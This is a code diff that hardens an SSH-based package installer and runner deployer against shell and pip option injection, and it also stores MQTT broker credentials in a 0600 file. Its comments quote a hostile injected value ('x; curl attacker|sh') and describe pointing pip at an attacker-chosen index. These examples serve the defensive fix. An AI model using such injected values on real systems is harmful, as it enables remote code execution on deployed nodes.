@@ -6,10 +6,13 @@ not the system Python.
 import asyncio
 import importlib
 import logging
+import re
+import shlex
 import socket
 import sys
 import time
 from pathlib import Path
+from typing import Any
 
 import asyncssh
 
@@ -28,6 +31,46 @@ logger = logging.getLogger(__name__)
 
 
 # pip package name → importable module name
+#: What a package name may look like. PEP 508 names are letters, digits, and
+#: `-`/`_`/`.` as internal separators; a version specifier or extras may follow.
+#: Nothing else — no path, no URL, no whitespace, and no leading `-`.
+_PACKAGE_NAME = re.compile(
+    # Name: never a leading dash, which is what makes an option an option.
+    r"[A-Za-z0-9][A-Za-z0-9._-]*"
+    # Optional extras: package[extra,extra]
+    r"(?:\[[A-Za-z0-9,._-]+\])?"
+    # Optional version specifiers, comma-separated: >=1.2,<2. No spaces — a
+    # space would let a second argument ride along inside one list element.
+    r"(?:"
+    r"(?:[=<>!~]=|[<>])[A-Za-z0-9._*+!-]+"
+    r"(?:,(?:[=<>!~]=|[<>])[A-Za-z0-9._*+!-]+)*"
+    r")?"
+)
+
+
+def is_installable_name(package: str) -> bool:
+    """Whether `package` is a package name and not an instruction to pip.
+
+    Two different exposures, one answer.
+
+    Locally the command is built as a *list*, so there is no shell — but pip
+    reads its own options from positional arguments, so `--index-url=http://…`
+    or a bare URL is honoured as configuration rather than treated as a name.
+    That is fetch-and-execute from an attacker-chosen index with no shell
+    involved, and it arrives in a spawn config an LLM wrote.
+
+    Remotely the same list is joined into a string and sent over SSH, so there
+    the value is also shell syntax — `;`, backticks, `$(…)`. `shlex.quote`
+    handles that half; this handles the half quoting cannot, because a properly
+    quoted `--index-url` is still an option.
+
+    An allow-list rather than a deny-list: the set of legitimate names is small
+    and describable, and the set of harmful strings is not.
+    """
+    candidate = (package or "").strip()
+    return bool(candidate) and _PACKAGE_NAME.fullmatch(candidate) is not None
+
+
 PACKAGE_TO_IMPORT = {
     "opencv-python": "cv2",
     "pillow": "PIL",
@@ -188,6 +231,15 @@ class InstallerAgent(Actor):
 
             # Resolve import name → pip name (e.g. "cv2" → "opencv-python")
             pip_name = IMPORT_TO_PACKAGE.get(pkg, pkg)
+
+            # No shell here — the command is a list — but pip reads its own
+            # options from positional arguments, so `--index-url=http://…` is
+            # honoured as configuration rather than treated as a name.
+            if not is_installable_name(pip_name):
+                logger.warning("[%s] Refusing to install %r — not a package name", self.name, pkg)
+                results[pkg] = "refused"
+                failed.append(pkg)
+                continue
 
             # Check if already importable (invalidate cache so fresh installs show up)
             import_name = PACKAGE_TO_IMPORT.get(pip_name, pip_name)
@@ -426,6 +478,39 @@ class InstallerAgent(Actor):
             )
             return str(path)
 
+    async def _put_broker_env(self, sftp: Any, target: DeployTarget, user: str) -> bool:
+        """Write the node's broker credentials to ``~/wactorz/.env``, mode 0600.
+
+        Returns whether anything was written — nothing is when the broker takes
+        anonymous connections, and writing an empty file would then leave the
+        runner exporting two blank variables over a working setup.
+
+        A node's own ``DEPLOY_<NODE>_BROKER_USER``/``_PASSWORD`` win; otherwise
+        it gets the server's. That default is the usable one — a single broker
+        with one account is the common deployment — but it does mean **a stolen
+        edge device holds full broker access**, and the broker carries the code
+        spawned agents run. Per-node accounts are the answer when that matters;
+        ``password_file`` holds as many users as you like.
+
+        This is the out-of-band channel the broker credentials must travel by:
+        sending them over the broker itself would publish the very secret that
+        protects it, to a channel that is unauthenticated until they arrive.
+        """
+        username = target.broker_user or CONFIG.mqtt_username
+        password = target.broker_password or CONFIG.mqtt_password
+        if not username and not password:
+            return False
+
+        body = f"MQTT_USERNAME={shlex.quote(username)}\nMQTT_PASSWORD={shlex.quote(password)}\n"
+        remote = f"/home/{user}/wactorz/.env"
+        async with sftp.open(remote, "w") as handle:
+            await handle.write(body)
+        # After writing, not before: SFTP creates with the umask, so there is a
+        # window either way, but a file that is never widened is better than one
+        # created world-readable and tightened later.
+        await sftp.chmod(remote, 0o600)
+        return True
+
     async def _ssh_kwargs(self, payload: dict) -> dict:
         """Build asyncssh connection kwargs for a task payload.
 
@@ -533,7 +618,17 @@ class InstallerAgent(Actor):
         if not packages:
             return {"error": "No packages specified"}
 
-        pkg_str = " ".join(packages)
+        refused = [p for p in packages if not is_installable_name(p)]
+        if refused:
+            # Refused rather than filtered: installing a subset silently would
+            # report success for a request that was not carried out.
+            return {"error": f"Not package names: {', '.join(refused)}"}
+
+        # Two guards, because neither covers the other. `shlex.quote` stops
+        # the value being read as *shell* syntax once this string reaches SSH;
+        # the allow-list above stops it being read as *pip options*, which a
+        # correctly quoted `--index-url=…` still would be.
+        pkg_str = " ".join(shlex.quote(p) for p in packages)
         self._log_remote(f"Installing {pkg_str} on {host}...")
 
         try:
@@ -663,10 +758,14 @@ class InstallerAgent(Actor):
                 await self._ssh_run(conn, "mkdir -p ~/wactorz")
                 self._log_remote(f"[{node_name}] Directory created.")
 
-                # 2. Upload remote_runner.py
+                # 2. Upload remote_runner.py and, if the broker needs them, the
+                # credentials it will read from its environment.
                 async with conn.start_sftp_client() as sftp:
                     await sftp.put(str(runner_path), f"/home/{user}/wactorz/remote_runner.py")
+                    env_written = await self._put_broker_env(sftp, target, user)
                 self._log_remote(f"[{node_name}] remote_runner.py uploaded.")
+                if env_written:
+                    self._log_remote(f"[{node_name}] Broker credentials written to ~/wactorz/.env.")
 
                 # 3. Create venv if it doesn't exist — avoids all --break-system-packages issues
                 ok, out = await self._ssh_run(
@@ -684,16 +783,36 @@ class InstallerAgent(Actor):
                 else:
                     self._log_remote(f"[{node_name}] aiomqtt installed into venv.")
 
-                # 5. Kill any existing instance with this node name
-                await self._ssh_run(
-                    conn, f"pkill -f 'remote_runner.py.*--name {node_name}' 2>/dev/null; true"
-                )
+                # 5. Kill any existing instance with this node name.
+                # The pattern is quoted as one argument rather than wrapped in
+                # literal quotes: a name containing a quote would otherwise end
+                # them and the rest would be read as more shell.
+                pattern = f"remote_runner.py.*--name {node_name}"
+                await self._ssh_run(conn, f"pkill -f {shlex.quote(pattern)} 2>/dev/null; true")
 
                 # 6. Start runner using venv python in the background
+                # Every interpolated value is quoted. `broker` comes straight
+                # off the task payload with no validation, so `--broker` used to
+                # accept `x; curl attacker|sh` and run it on the node. `node_name`
+                # is checked by `deploy_name_error`, but that only forbids the
+                # MQTT topic characters `# + /` — a space, a `;` or a `$(…)` is a
+                # perfectly acceptable node name as far as it is concerned.
+                # `~` is left outside the quotes so the remote shell still
+                # expands it.
+                log_path = shlex.quote(f"{node_name}.log")
+                # Sourced, never passed. Putting MQTT_PASSWORD=… in front of the
+                # command would keep it out of the *runner's* argv, but SSH exec
+                # runs `$SHELL -c '<the whole string>'`, and that wrapper's argv
+                # is readable by any local user with `ps` for as long as the
+                # launch takes. Sourcing a 0600 file puts it in no argv at all.
+                launch_env = "set -a; . ~/wactorz/.env; set +a; " if env_written else ""
                 cmd = (
+                    f"{launch_env}"
                     f"nohup ~/wactorz/venv/bin/python ~/wactorz/remote_runner.py "
-                    f"--broker {broker} --port {mqtt_port} --name {node_name} "
-                    f"> ~/wactorz/{node_name}.log 2>&1 &"
+                    f"--broker {shlex.quote(str(broker))} "
+                    f"--port {shlex.quote(str(mqtt_port))} "
+                    f"--name {shlex.quote(node_name)} "
+                    f"> ~/wactorz/{log_path} 2>&1 &"
                 )
                 await self._ssh_run(conn, cmd)
                 self._log_remote(f"[{node_name}] Runner started with venv python.")
